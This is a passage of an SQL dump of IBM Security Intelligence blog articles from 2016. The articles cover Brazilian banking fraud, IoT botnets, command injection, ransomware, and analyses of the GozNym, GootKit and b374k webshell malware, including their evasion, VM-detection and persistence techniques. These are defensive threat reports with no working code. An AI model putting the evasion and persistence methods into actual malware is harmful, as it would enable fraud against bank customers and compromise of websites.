fraudulent transfer from an endpoint he or she controls. This is an example of account takeover fraud. The fifth trend on the Brazilian roster does not target online banking per se, but it is specific to a popular online payment method used in South America known as  . Boletos are the equivalent of online money orders, which are used extensively in Brazil for any type of payment, especially by individuals who do not own a credit card. Criminals manipulate Boleto payments and alter their routing information in a way that sends the money to an attacker instead of the intended payee. To seamlessly alter the payment information on Boletos, cybercriminals use malicious extensions that infect the internet browser and tamper with Boleto details on the fly. In a sense, this is reminiscent of malicious browser helper objects (BHO malware) leveraged by Trojans like Zeus about decade ago. With that, banking Trojans would alter the account number and amount on outgoing online transfers and bill payments from compromised users. The malicious extensions are a simple way to modify the details of online Boleto Bancario payments. They target the editable lines of the Boleto, which include the payee’s account number and payment amount. This change takes place before the user sends the payment to their intended payee, thus having them unknowingly send money to an attacker. As an added measure, criminals often sabotage Boleto payments by rendering their original barcode illegible to electronic scanners. That way, when the intended payee attempts to validate the Boleto’s barcode at the bank, the clerk is forced to enter the information manually, at which point he or she inadvertently sends the money off to the criminal’s account. Two very popular names for these malicious extensions are HyperK and Eupuds. According to IBM X-Force researchers, proxy changer malware has been the most popular attack vector in Brazil for at least the past six years. Don’t expect anything sophisticated here — it’s a twist on a timeworn threat. Instead of the older way of altering the hosts file, proxy malware tampers with the victim’s proxy auto-config (PAC) file. PAC files are the browser’s go-to resource when it needs to automatically choose the correct proxy server that will fetch a requested URL. Malicious PAC files started gaining notoriety in Brazil in 2009, when several proxy changer malware families were detected editing the URLs inside PAC files on infected machines. Malware can tamper with PAC files in a number of ways: It can edit the PAC, add an entirely new PAC to the browser, or delete the legitimate one and replace it with the bad version. Cybercriminals in Brazil continue to exploit proxy manipulation to send victims to phishing pages when they attempt to navigate to their bank or credit card provider’s website. Brazilian cybercriminals use legitimate tools and Windows default wares to stop or delete security software from infected endpoints so that security software does not interfere with their malware. For example, a free tool called   is designed to monitor system resources. This tool can be used maliciously by cybercriminals to end processes of security products that may be running on the victim’s endpoint. Brazilian cybercriminals also use  , a popular rootkit detector and remover. Gmer can enable the deletion of otherwise protected files, like those of security software, from the deeper zones of the operating systems. In some cases, cybercriminals can achieve the same result by creating pop-up boxes prompting the user to shut off their own security software. This type of social engineering allows even unsophisticated criminals to get away with fraud. Simplistic cybercrime has gained momentum in Brazil due to a variety of factors: Cybersecurity can definitely improve in Brazil through user education and overall awareness to online threats. Brazilians can counter cybercrime by deploying the  , guarding online accounts with   and   against the threats described above.', '\'Banking Trojan\', \'Brazil\', \'Credit Card Fraud\', \'Fake Browser\', \'Fraud\', \'Malware\', \'Overlay Attack\'', 'https://securityintelligence.com/the-brazilian-malware-landscape-a-dime-a-dozen-and-going-strong/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (222, 'Going for Gold: Cybercrime and the Brazilian Threat Landscape', 'Pamela Cobb', '2016-7-21', 'This summer more than 10,500 athletes will compete to win bronze, silver and, most coveted of all, gold medals. Likewise, cybercriminals will be competing to steal your crown jewels: personal data and funds. As part of its mission to educate clients and the public at large,   has published a special report on the Brazilian threat landscape to raise awareness of cybercrime and recommend practices to mitigate these threats for businesses and travelers. When I think back to the summer of 1996 in Atlanta, I consider the choice that my then-job at Georgia Power afforded me: I could either sit in and monitor an electric substation for problems during 12-hour shifts in the heat of a Southern summer or be a driver and translator for an international attendee. The choice was easy, and I ended up with wonderful memories of a global community of organizers and volunteers built around the true meritocracy of athletic achievement (in an air-conditioned BMW). In the back of my mind, however, lingered the fear: What if the electric grid was compromised? While that didn’t happen in 1996, Atlanta had its share of fear with the event venue bombing. Threats to global events on the same scale as large international sporting competitions have not receded in that time; the Brazilian government and sponsors of the 2014 World Cup were subject to large-scale distributed denial-of-service (DDoS)  . What, then, can visitors and viewers expect of the Brazilian threat landscape this summer? When it comes to cybercrime, professionals know that just as Eastern Europe produces the most sophisticated malware, the Brazilian cybercrime arena is a leader in internet fraud. Brazil has the   of online banking fraud and financial malware targets of any country in the world. In 2014,   to internet crime, and the losses did not subside in 2015. Cybercrime is the top economic crime in the country; it ranks fourth on the economic crimes chart in the rest of the world. Many internet users combined with low security awareness means that cybercrime has been gaining momentum in the Brazilian threat landscape, targeting oblivious individuals and  . Financial malware is prolific in Brazil, and the same types of malcodes are spread far and wide on user endpoints throughout the country. Whether Trojans, image-based phishing or fake browsers, a wide variety of attack vectors have been used by cybercriminals to take advantage of the population. For the cybercriminal at work this August, there may be no reason to give up on time-tested attacks such as DDoS, phishing and other traditionally profitable methods of fraud and theft. With huge numbers of unsuspecting visitors in the country, the potential profit will prompt attackers to try every method available, both online and offline. For the individual computer or smartphone user, there is every reason to be careful of these attacks. Traditional   tips hold true for enterprise users or individuals heading to Brazil. The No. 1 tip for travelers is, as always, awareness. Be cognizant of both your physical and cyber surroundings, as well as where and how you are using payment cards. Guard your personal and digital information with extra care. Threats usually aren’t obvious — they can be hidden deep inside your hardware and software. Software skimmers are specialized malware packages that monitor point-of-sale (POS) endpoints’ RAM memory for plaintext card data, while hardware skimmers can fit inside normal card readers and fool not only vendors, but also customers — all while copying the magnetic stripe of the cards used in POS machines or ATMs.', '\'Advanced Threats\', \'Brazil\', \'Cybercrime\', \'Distributed Denial-of-Service (DDoS) Attacks\', \'Fraud\', \'Phishing\', \'Security Awareness\', \'Threat Intelligence\'', 'https://securityintelligence.com/going-for-gold-cybercrime-and-the-brazilian-threat-landscape/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (223, 'The Threat From Weaponized IoT Devices: It’s Bigger Than You Think!', 'Lyndon Sutherland', '2016-7-20', 'IoT devices, such as smart meters, smart watches and building automation systems, are prolific. You may think that compromised IoT devices pose a danger only to the devices’ owners — for example, it’s easy to understand the privacy violation of an attacker viewing a web camera feed without the owner’s permission. But compromised IoT devices can also pose a danger to others. A few years ago at a security conference, a researcher clearly demonstrated this by conducting a worm attack on a smart meter. In real life, the consequences of this sort of attack   for thousands of consumers. A worm is just one attack vector. The use of IoT devices as a distributed denial-of-service (DDoS) platform and the creation of highly effective and globally distributed botnets is another. Unfortunately, in many cases the attackers don’t even need to exploit a technical vulnerability to execute their schemes. Rather, they just need the default administrative username and password, with which many devices come preconfigured and many users do not change. One report indicated that   of IT professionals do not change their wireless router’s default password. If so many IT professionals fail to do such a simple task, imagine what the percentage might be among average home users. They simply connect a device and perform the basic setup procedure, which may not enforce password changes or could come preconfigured to allow remote management from the internet. Two recent reports showed how  , made up of web-accessible compromised cameras, have been used in DDoS attacks. Last year,   noted that the most common IoT botnet activity that it observed is from compromised CCTV cameras. Months later,   reported a novel DDoS attack in which the botnet leveraged compromised CCTV devices. According to Sucuri, the botnet was able to generate some 50,000 HTTP requests per second coming from 25,513 unique IP addresses. But that’s only the tip of a rather large iceberg. A group of cybercriminals who go by the name Lizard Squad are infamous for their DDoS attacks, mainly against gaming servers and services. They first gained notoriety by selling access to their DDoS platform, commonly referred to as stresser or booter services.  reported on two LizardStresser botnets, which have been used to attack Brazilian targets, including banking, government and telecom organizations, as well as three U.S.-based gaming companies. Research revealed that the majority of the compromised IoT devices leveraged by the botnet were internet-accessible webcams. What is somewhat unusual about these attacks is their magnitude, reaching at peak more than 400 GB of traffic — and that’s without using any UDP-based reflection traffic, which is typical in large DDoS attacks. This botnet appears be different from what was reported by Sucuri. Considering that the largest reported DDoS attack was in the region of 500 GB and likely included UDP reflection traffic, the capacity of these IoT-driven botnets is downright scary, in part because it is composed of only a small fraction of the IoT devices already connected to the internet. It’s easy to blame the owners of IoT devices for not changing default passwords or failing to update firmware, which may have  . It’s equally easy to blame device vendors for failing to include an initial setup process that forces the end user to change default passwords — and possibly even usernames — upon initial setup. Some might also try to blame the likes of   for making it easy to locate and exploit vulnerable IoT devices. Of course, the attackers are to blame, but they will take the path of least resistance and attack easily compromised devices first. Like other attack surfaces such as web servers and databases, IoT devices require hardening as soon as they’re installed to mitigate the threat of compromise.   can help lock down these devices before cybercriminals attack. Home and enterprise users should: Meanwhile, enterprise security teams should:', '\'Botnets\', \'Connected Devices\', \'Endpoint\', \'Endpoint Protection\', \'Endpoint Security\', \'Internet of Things (IoT)\'', 'https://securityintelligence.com/the-threat-from-weaponized-iot-devices-its-bigger-than-you-think/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (224, 'Command Injection: A Deadly Needle in the Haystack', 'Dave McMillen', '2016-7-14', 'Looking across the threat landscape at cybercriminals’ go-to attack vectors, we see   high on the list. But there’s another injection method that also poses a serious threat: command injection. In late September 2014, a more than 20-year-old vulnerability in the GNU Bash shell, which was widely used on Linux, Solaris and OS X systems, sparked the mobilization of attacks known as Shellshock. This first vulnerability quickly gave way to the disclosure of several additional vulnerabilities affecting the UNIX shell.  observed a significant increase in focused attacks targeting these vulnerabilities within 24 hours of their disclosure. The attacks came in waves, from different source IPs and originating countries. Almost two years later, we are still seeing a significant amount of Shellshock attacks. \n A successful command injection attack allows an attacker to issue arbitrary commands within a vulnerable web application environment. This happens when an application passes malicious user-supplied input — via, for example, forms, cookies or HTTP headers — to a system shell. If the data input is not validated properly, the attacker can inject additional   and have them executed with the permission of the vulnerable application. Simply put, this means that a critical web server and its entire back-end database can be completely compromised. Because command injection attacks are one of the most common and successful attacks on the web, they are not likely to fade away anytime soon. Defending against these attacks requires implementation of strict defensive tactics, which are often overlooked when web applications are initially deployed — especially those applications developed in-house. The IBM report “ ” takes a more focused look at how these attacks are perpetrated and how you can protect your web environment from them.', '\'IBM Managed Security Services (MSS)\', \'Shellcode\', \'Shellshock\', \'SQL Injection\', \'Vulnerabilities\'', 'https://securityintelligence.com/command-injection-a-deadly-needle-in-the-haystack/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (225, 'Hacking the Connected Building: Real-Life ‘Mr. Robot’', 'Pamela Cobb', '2016-7-13', 'Television shows have served as a respite to real life since TV was first invented. In my own life, analyzing episodes of “Lost” on a newborn online community kept me company during the very real demands of an actual newborn while I was on maternity leave. What is perplexing about “Mr. Robot,” however, is how it freakishly mirrors real life while also providing the escapist elements that make for good television. With the season-two premiere of Mr. Robot looming, fans are waiting to see if the second season can possibly match the intricacy and engagement of the first. I’ve found that our friendly water cooler-based debates don’t center around the feasibility of the hacks so much as the fashion choices on the show. That’s because there’s zero debate on the authentic representation of the hacks on the show, compared to a lively discussion on whether   are passé. In real life*, the IBM X-Force research team has done its fair share of vulnerability and penetration testing. One notable example was the  , which successfully took advantage of a building automation system to control the environment. Not only did it affect temperature control systems, but it also connected to the central server and extended control to several other geographically disperse buildings. The hack was ultimately possible through a mix of policy settings on routers, lack of encryption on files containing passwords, duplicate passwords across systems and internal systems connected directly to the internet. It is suspected the   did not wear hoodies while conducting the ethical hack, but these reports are unconfirmed. If you search the archives for Internet of Things (IoT), you’ll find a treasure trove of warnings and advice for developers. With phrases like “too big to protect” or “double-edged sword” often used when discussing IoT, it’s no wonder there are so many articles about it. With the new season of “Mr. Robot” taking place after the infamous Evil Corp hack, I’m curious how prominent IoT may be in the story. The series’ technical consultant Kor Adana alluded to a possible inclusion in a  , leaving me to fervently hope that the dramatic tension gets ratcheted up when Evil Corp’s break-room refrigerator gets hacked and the fsociety gang adds insult to injury by revealing exactly how many flavored creamers the conglomerate consumes each month. To learn more about an actual connected building hack, view the   with IBM X-Force.', '\'Connected Devices\', \'Hackers\', \'Hacking\', \'Internet of Things (IoT)\', \'Security Intelligence\', \'X-Force\'', 'https://securityintelligence.com/hacking-the-connected-building-real-life-mr-robot/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (226, 'CryptoLocker Ransomware Is on the Rise — Here’s What to Do if You’re Attacked', 'Antonios Papadimitriou', '2016-7-13', 'CryptoLocker attacks are on the rise, along with many other types of ransomware. While these threats can be a serious detriment to an enterprise, there are some security measures that can reduce the risk of such an attack and improve overall security posture.\n Here is what to do in case of an incident, as well as how to prevent similar attacks in the future.\n Organizations should start by adopting an aggressive patch management policy, especially with browser vulnerabilities existing in plugins such as Adobe Flash and Java, which are used by a large portion of employees. Patches should be applied in a timely basis. For example, IBM noted that the recent Adobe patches for ransomware are to be applied as soon as possible. Adobe defined this time period as within 72 hours.\n Unfortunately, patching isn’t a huge help when it comes to ransomware such as  . When a computer becomes  , the malware typically generates a very small amount of external network traffic. Upon infection, most versions of ransomware utilize a domain generation algorithm (DGA) to randomize the DNS request that it makes to the command-and-control (C&C) server. This makes blacklisting the known domains much harder: The malware will use the DGA to generate thousands of randomized domain names, but only one may be a legitimate domain used to connect to the C&C server.\n This initial contact with the C&C server enrolls the computer and obtains the public encryption key(s) it then uses to encrypt all the user’s files. Therefore, a memory dump or network traffic capture will do very little to help gain the necessary information to restore the files since the private key needed to decrypt the files never exists on the victim computer.\n The best way to fully bounce back from a ransomware attack is to never become a victim. Prevention methods include:\n There are also some critical steps organizations should consider with respect to their readiness for a potential attack:\n Organizations should consider using different antivirus products for different purposes. For example, one antivirus product could be used for desktop machines, a different one for servers and another for the email gateway. This strategy can provide maximum coverage for emerging threats that may not be detected by one solution but could be identified by others.', '\'Adobe\', \'Adobe Flash Player\', \'Advanced Threats\', \'CryptoLocker\', \'Malware\', \'Patch Management\', \'Ransomware\'', 'https://securityintelligence.com/cryptolocker-ransomware-is-on-the-rise-heres-what-to-do-if-youre-attacked/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (227, 'Two Heads Are Better Than One: Going Under the Hood to Analyze GozNym', 'Lior Keshet', '2016-7-12', 'In April 2016, IBM X-Force Research   that combines the Nymaim downloader and the Gozi Trojan’s financial fraud module, naming that new banking malware GozNym. The inner workings of GozNym are quite interesting. This post is an overview of the GozNym Trojan’s main structure, with added details on its fraud-facilitating components as determined by X-Force Research. Gozi, also known as ISFB or Ursnif, is a financial Trojan that has had its source code leaked twice. The first and most significant leak  , and the second occurred in late 2015. The essential parts of the Gozi code have been widely used in the past few years and are still being used by a variety of cybercriminals today. Gozi remains popular due to the effectiveness of the source code and its modularity. Two noteworthy modules that keep this malware relevant are: The Nymaim malware has been around since 2011 and was always known to be deployed in combination with additional malware. This kind of Trojan is usually referred to as a downloader. In its  , Nymaim was used exclusively for dropping ransomware — way before ransomware became as prevalent as it is today. While Nymaim’s operators have touched on financial malware since then, they never stuck with any specific banking Trojan until 2015. In late 2015, IBM X-Force researchers started detecting stealthy malware infection campaigns in which Nymaim downloaded the Gozi Trojan and then used it in fraud attacks on online banking customers. These campaigns prompted a more detailed investigation of Nymaim’s malicious activity and eventually led researchers to discover Nymaim’s new hybrid form, which was named GozNym. That deployment mode changed in early 2016, when X-Force researchers noticed a subtle yet significant modification in this malware’s code: Nymaim began using a modified version of Gozi’s financial module and embedded it into the actual code. This version of the module is only usable in combination with another piece of code that was injected into the browser. By making this change, Nymaim was no longer a mere downloader used for running other pieces of malware. Rather, it became a hybrid banking Trojan that stands on its own and is detected as such. Since taking on its hybrid form, X-Force researchers have been paying close attention to GozNym. They have observed that it has become one of the most active players in the financial malware arena with capabilities such as  , which are typical reserved for elite cybercrime gangs such as Dridex. The most common infection method we observed used with GozNym is a three-step process that begins with phishing emails containing poisoned Word documents. In the campaigns studied by X-Force researchers, malicious macros in the documents executed a Pony Stealer malware variant, which in turn downloaded and executed the GozNym installer/loader. When GozNym gets executed, it begins by avoiding researchers. We observed samples using different evasion techniques every time, but one dominant method stands out: the  . With this verification on GozNym’s part, the malware would not run unless the current date of execution is very near the time of the infection campaign. This way, if researchers try to execute the sample even a few days after the campaign, it would not run without additional actions. Another anti-research technique we saw in GozNym’s deployment process was filtering victims by geolocation. To filter out irrelevant machines from intended campaign targets, the C&C server would check the victim IP’s geolocation and stop the malware’s execution on machines from the wrong country. This contributed to the malware’s ability to keep researchers’ endpoints out of the botnet. Under the standard infection flow, GozNym’s loader runs a hollowed process of Rundll32.exe, which in turn will inject its payload to other processes. The payload itself is heavily obfuscated. GozNym’s loader layers on additional anti-research techniques. The first is  , which is composed of several mechanisms. When those are combined, they make it very difficult for security researchers to be able to statically follow the control flow of the program. Another anti-research technique used here is  . Instead of directly calling a WinAPI, GozNym hashes a value in the place of the call and then continues by hashing each WinAPI until it encounters the matching hash to find its target. Strings are hidden and dynamically decrypted only when needed. Once the string is used, it gets overwritten to avoid leaving traces in memory. To keep a hold on the victim after system reboots, GozNym uses several persistence mechanisms. On one hand, having redundancy in this aspect is useful since the infection would remain even when only parts of the code were present. On the other hand, it adds extra noise and makes GozNym easier to spot. Registry run values used by the GozNym hybrid for persistency are located at: Each run value points to a unique GozNym binary, located in %programdata% or in %appdata% folders. Example run values include rheology-37 and bending-1. These names are hard-coded, fetched from a list that seems to be manually generated by the developer and often modified. Furthermore, GozNym adds its binary to the Windows system’s Startup folder. These binaries differ from the original GozNym loader as well as from one another. With that, all of GozNym’s binaries perform the same task: Execute GozNym after a system reboot — with one catch. Before completely executing, the binaries verify that the machine they are located on is the same as the machine that the original GozNym loader infected. This test is performed by checking the details of a specific registry value: Since Nymaim used to inject Gozi’s financial module into the victim’s browser and GozNym injects its own code as well as the modified ISFB financial module, let’s take a deeper look into the differences between Gozi’s original financial module and the modified version that was created when used by the GozNym hybrid. Inside the browser’s process, GozNym’s highly obfuscated code acts as an interface for Gozi’s financial module. This makes researching it significantly more complicated. Two examples for using this interface are: Screen captures in the figures below show GozNym’s financial module in disassembly via IDA Pro. Note the call_nymaim_decrypt_conf function call is actually a part of the API and is used to obtain the decrypted webinjects. This function calls to the second injected module via the gate_to_nym_API function. \n \n In the next figure we can review the dynamic execution of the same code, just after the call to the gate_to_nym_API. The webinjects are already decrypted, as can be seen in the memory window on the left. Like most classic financial malware, GozNym’s main modus operandi is the modification of communications between the user’s web browser and a bank’s servers, which allows it to alter the content of webpages presented to infected victims. Trojans can also modify commands that the user issues to the bank. This interception and modification becomes possible by patching the browser’s internal functions, which is a method that bypasses SSL protection. The instructions required for the webpage data manipulation are contained in what’s called a webinjection configuration. This data usually comes separately, fetched by the malware itself, and is kept within the Windows file system in encrypted form. In GozNym’s case, the configuration file is kept under the %TEMP% folder, protected by several layers of encryption. GozNym’s webinjects file requires four phases of decryption to reveal its targets and attack schemes. The first and third phases of the decryption routine share the same code but use different keys and encrypted data. The process is as follows: Within the context of GozNym’s four-phase encryption, the last layer is the most interesting part. After decrypting the first three layers, the webinjects data is encrypted with the Serpent cipher, the key of which is stored inside a binary structure that the original ISFB author named DS_Header (see Figure 6). It is found at the end of the encrypted webinjects data. Since the DS_Header is encrypted with an RSA crypt, the malware’s binary contains a hard-coded RSA key it uses for decrypting the DS_Header. The result is a cleartext Serpent key that is then used to the decrypt the rest of the webinjection configuration. \n After the first two phases, the data contains the webinject’s size and the webinjection itself, still in encrypted form shown in Figure 5. \n \n Based on IBM X-Force data, the GozNym Trojan is showing increasing malicious activity levels. It is now  , and it is expected to continue introducing upgrades and modifications in the near future. IBM Security can help banks and targeted organizations learn more about this high-risk threat. To help stop threats like GozNym, banks and service providers can use adaptive   with malware intelligence that provide real-time insight into fraudster techniques and capabilities. These tools are designed to address the relentless evolution of the threat landscape. Users looking to prevent advanced malware infections should follow security best practices at all times. This includes updating frequently used programs regularly and practicing good browser hygiene, such as avoiding suspicious websites. Since GozNym and banking malware like it is usually delivered as email attachments, it is also vital to never click on links or attachments in unsolicited email. IBM X-Force Research will be updating information and   via the  . Join today to keep up to date about this threat and other findings from our cybercrime labs.', '\'Banking Trojan\', \'Financial Industry\', \'Fraud\', \'Gozi\', \'Gozi Trojan\', \'GozNym\', \'IBM X-Force Research\', \'Nymaim\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/two-heads-are-better-than-one-going-under-the-hood-to-analyze-goznym/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (228, 'GootKit: Bobbing and Weaving to Avoid Prying Eyes', 'Limor Kessem', '2016-7-8', 'Discovered in the wild in the summer of 2014, GootKit is believed to be a privately held cybercrime tool that is not sold to other criminals in underground forums and is operated by a closed gang. Considering its stealth, data theft and browser manipulation capabilities, GootKit is one of the most advanced banking Trojans active nowadays. It is used in online banking fraud attacks that target consumer and business bank accounts primarily located in Europe. In online banking fraud attacks witnessed throughout 2016, GootKit’s masters leverage this malware’s capabilities to infiltrate the endpoints of retail and business banking customers, steal their personal authentication credentials and manipulate their online banking sessions with social engineering. They eventually take over those accounts and transfer cash to mule accounts they control. Beyond its overall modus operandi, GootKit is a malware project that implements stealth and persistency alongside real-time, web-based activities like dynamic webinjections, which modify the banking website as rendered in the infected machine’s browser. Since it is operated by one gang, GootKit is believed to have its own in-house developers focused on evolving its stealth mechanisms, security evasion techniques and fraud capabilities.  analysis of the GootKit Trojan showed some interesting changes were made to the code in June 2016, including: X-Force researchers who analyzed GootKit believe that in an effort to shrink the size of videos captured on infected victim machines, GootKit’s developers made some cosmetic changes to their video-grabbing module. Up until its recent variants, GootKit recorded videos of the victim’s desktop and exfiltrated them to its command-and-control (C&C) server in MP4 files. These files are typically hefty in size. A new format enforced by GootKit’s developer is .ivf files, which are encoded by using the Indeo codec from Ligos Corporation. This is a peculiar move on GootKit’s part because .ivf files are quite an old format. The codec was popular in the 1990s since it was the first to allow full-speed video playback without using hardware acceleration. This standard was superseded by newer formats and became rare. It’s possible that .ivf files were selected for smaller size, and also for being a format that most modern-day security software may not inspect or block upon exfiltration to the criminal’s servers. Once GootKit has a video in this format, it compresses the file to .lzma for a lighter file that can preserve the video’s quality. LZMA files are similar to other compression algorithms, such as ZIP, that compress data to save disk space. However, LZMA compression is known to provide faster decompression times than other algorithms. These types of files are mostly used in Unix-based operating systems. It appears that keeping itself as elusive as possible is a top concern for GootKit. One of GootKit’s most advanced malware capabilities lies in its security and research tool evasion techniques. It is evident to IBM X-Force researchers that GootKit’s developers have built and continue to build high walls around the malware to keep it away from researchers’ prying eyes. In recent GootKit builds, we can clearly observe these capabilities. The first check for virtual machine (VM) values takes place at the dropper phase before GootKit’s payload is deployed. The dropper verifies the system’s processor value inside the Windows Registry, searching for a specific name used in servers. The dropper further checks for VM resources on disk and for additional specific values in the Registry. For example, it checks the target device’s basic input/output system (BIOS) to find values that may indicate a virtual machine client installed on it, including: The next check goes over the machine’s MAC address, looking for a list of values that usually appear when the endpoint is a virtual machine. If any of the suspect values are found, GootKit raises a VM flag and quits its activity. The info is sent to the C&C to allow the botmaster to take action on the issue — like blacklist the endpoint. At this point, if all checks are clear, the dropper unpacks the GootKit payload and deploys its modules on the infected endpoint. After the GootKit payload is deployed, some VM checks are repeated and others are added. For example, the malware scans for telling BIOS Registry values. It then checks for a white list of names acceptable for the central processing unit (CPU); any other name would raise a VM flag. This check is performed because VMs typically attribute a specific name to the CPU that would differ from names used in physical endpoints. This verification of CPU-related information is not unique.  , the Dyre malware checked for processor cores on the target devices before fully installing, aiming to detect VMs that typically only run on one core to save resources. That sets VMs apart from most user machines that would run on at least two cores. In the next check, GootKit scans for   hard drives on target machines. GootKit’s developers are looking to scan for VM values (specifically VMWare, VBOX and SONI) that are more deeply embedded in the target system and cannot easily be modified by crafty researchers who would set up a VM to appear identical to a potential victim’s device. For GootKit, this means reliability: It can better detect whether the device it is being run on is a physical machine or a VM iteration. To ensure its successful deployment to as many machines as possible, the malware is constantly changing things up, keeping static and signature-based security software guessing. The twists implemented into GootKit’s most recent build include changes to the file type and the process into which the malware is injected. For example: Most modern-day banking malware — GootKit included — are executable files that get deployed on the infected machines by a dropper. But recent changes to GootKit modified the essence of deployment. Instead of executing a .exe file, GootKit only loads a DLL into a poisoned process of its choice. This is where the next change comes into effect. Instead of the common method — used by almost all banking malware — of injecting its malicious code into the explorer.exe process, GootKit injects into a service host (svchost) process. While both processes are commonly run by the system at all times, and both are able to be injected into, perhaps loading GootKit’s DLL through a process that runs multiple different instances at the same time can be confusing to detect. Explorer.exe, in contrast, is a process that only runs as one instance at a time. Another refreshed function for this advanced malware is the persistence mechanism. All malware aims to survive reboots and attempted deletion. In the past, GootKit used to persist by writing a user shell registry key that executed when the user logged in to the machine. This has been switched up to resemble a method  : setting up the malware as a scheduled task of the operating system. In its new build, GootKit presents two persistence options. First, when deploying the malware with least-privilege user account (LUA) rights, GootKit uses a scheduled task written under a randomized name. The task is triggered to run every minute, acting as a watchdog. It also runs after every boot to ensure GootKit’s presence on the endpoint after virus scans or system updates. In cases where GootKit is deployed with Windows admin rights, it can write its payload as a Windows service. The biggest advantage to running an application as a service is that it will start running before a user logs on and continue running even after the current user logs off. Thus, in the case of malware like GootKit, the Trojan is more persistent overall. The service’s name here is randomized, allowing GootKit to appear vague enough to a user opening the running processes list and benign to any security software that may be running a scan. The malicious file’s service properties window appears below: GootKit is a constantly evolving malware. Its developers have been upgrading its evasion and persistence mechanisms often and with sophistication to maintain this Trojan’s deployment rates and stealth. The malware’s dropper is typically delivered into user endpoints via well-known exploit kits such as Neutrino and Angler, making it relatively effective in compromising users who may not have fully patched their operating systems. In terms of its targets, GootKit configuration file analysis reveals that it mostly targets French and U.K. banks. Some of this malware’s configurations also target Italian and Spanish banks, according to IBM X-Force Research. X-Force data indicated the malware was further detected in infections on Japanese endpoints. However, those seemed opportunistic rather than deliberate since Japanese banks did not appear in GootKit configurations and the gang continues to focus on Europe. Overall, GootKit is known to be deployed in limited regions. As a result, it only accounts for 4 percent of the global attack volume by financial malware. X-Force Research expects to see GootKit continue to evolve. IBM Security can help banks and targeted organizations learn more about this high-risk threat. To help stop threats such as GootKit, banks and service providers can use adaptive  . They can also   with malware intelligence that provides real-time insight into fraudster techniques and capabilities, designed to address the relentless evolution of the threat landscape. Users looking to prevent advanced malware infections on their endpoints must keep their operating system up to date at all times, update frequently used programs and delete those they no longer use. The best browsing hygiene for the prevention of Trojan infection includes disabling ads and avoiding susceptible sites typically used as infection hubs. Since GootKit and banking malware like it are usually delivered as email attachments, it is critically important to never click on links or attachments in unsolicited email. IBM X-Force Research will be updating information and   via the  . Join XFE today to keep up to date about this threat and other findings from our cybercrime labs.', '\'Banking Trojan\', \'GootKit\', \'IBM X-Force Research\', \'Malware\', \'Trojan\', \'Virtual Machine (VM)\', \'X-Force\'', 'https://securityintelligence.com/gootkit-bobbing-and-weaving-to-avoid-prying-eyes/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (229, 'The Webshell Game Continues', 'Dave McMillen', '2016-7-8', 'The IBM X-Force Research team reported an   in April 2016. More recently, webshells dubbed b374k made their mark with attacks that the team has been tracking over the past few months. Although this blog highlights some features of the b374k shell, the main objective is to call your attention to the fact that PHP applications are becoming an increasingly popular choice for attackers aiming to glean your data and deface your website without much hard work. This threat should be pushed to the top of your priority list — primarily because of the power of the tool used for this type of attack, but also because of the startling increase in this attack type this year. Open-source PHP shells are common and can be downloaded from many openware distributors. PHP shells are useful tools for system or web administrators to perform remote management without using cPanel or Plesk, two of the biggest commercially available web administrative tools. These typically run as stand-alone applications. With PHP shells, all management activities take place within a web browser by simply pushing the core PHP code to the webserver’s HTML directory and calling it in a URL. This seems like an easy solution without having to add another application to perform management. The main dilemma is that anyone can modify the PHP code and add extra features. Let’s take a look at the full feature list of this particular webshell, b374k. It includes: This webshell essentially enables one-stop shopping for an attacker. It allows actors to: Let’s take a quick look at the interface. The screenshot below shows a dump of the root directory contents of a research sandbox that the research team planted the webshell script upon and called through Chrome. In the cases we researched, the shell command injection attack contains an instruction to retrieve an image file, save it to filename index.old.php, and set the permissions to read and execute: \n This won’t overwrite the base index.php file and cause immediate alarm. In many cases, administrators will rename their current index.php files to .old for backup purposes after they modify the main file. This file can be called from the attacker’s browser once it is planted. In this example, the webshell is disguised as an image file. It is encoded, compressed and then passed to the eval function: \n \n \n   \n Upon decoding, the full script appears. After execution of the PHP script in a lab environment, it becomes clear that a password is necessary to connect, but is not included in the script. There is also a line that refers to an MD5 hash that is not similar to the MD5 of the file. Decoding the MD5 revealed the following: Now we can gain access to the full features of this webshell. There are many ways webshells can be installed on your enterprise web server.   listed several, including: We detect webshell attacks via our command injection rules within our security information and event management (SIEM) environment. It is easy to see the webshell attempt using this ruleset since the instructions to retrieve the malicious file will most always be present within the event context. IBM Managed Security Services data from Jan. 1, 2016, through June 30, 2016, revealed that webshell attacks comprised about 15 percent of the total number of command injection attacks. This might not seem like much, but we don’t normally see one single attack type show up with this kind of persistence for long periods. As of this writing, according to  , only seven out of 52 antivirus solutions detect this particular webshell even though it contains clear backdoor functions.  7bfc8047de5babe0d488792851c0a04c  b24b9895ecd48430a0aeef09579f437e0622347e  faa2d51bc067a46cfc7c357cf930ae9d7b748dcf79190e65ccf4ad5013c38045  3072:GqNXqNNkn7V2bLUooHqExUyMOKxk3EunktNBfzbxNF3KPSf2wxOzYP350IZRZb5K:9NXqNNBQooHqExUyMOKxk3EunkVzbxN4 : 126.0 KB (129,033 bytes) Prevention goes a long way toward limiting the risk of exposure to webshell attacks. The following recommendations can help keep malicious webshells out of your environment.', '\'Content Management System (CMS)\', \'IBM Managed Security Services (MSS)\', \'IBM X-Force Research\', \'Shellcode\', \'Vulnerability\', \'WordPress\', \'X-Force\'', 'https://securityintelligence.com/the-webshell-game-continues/');
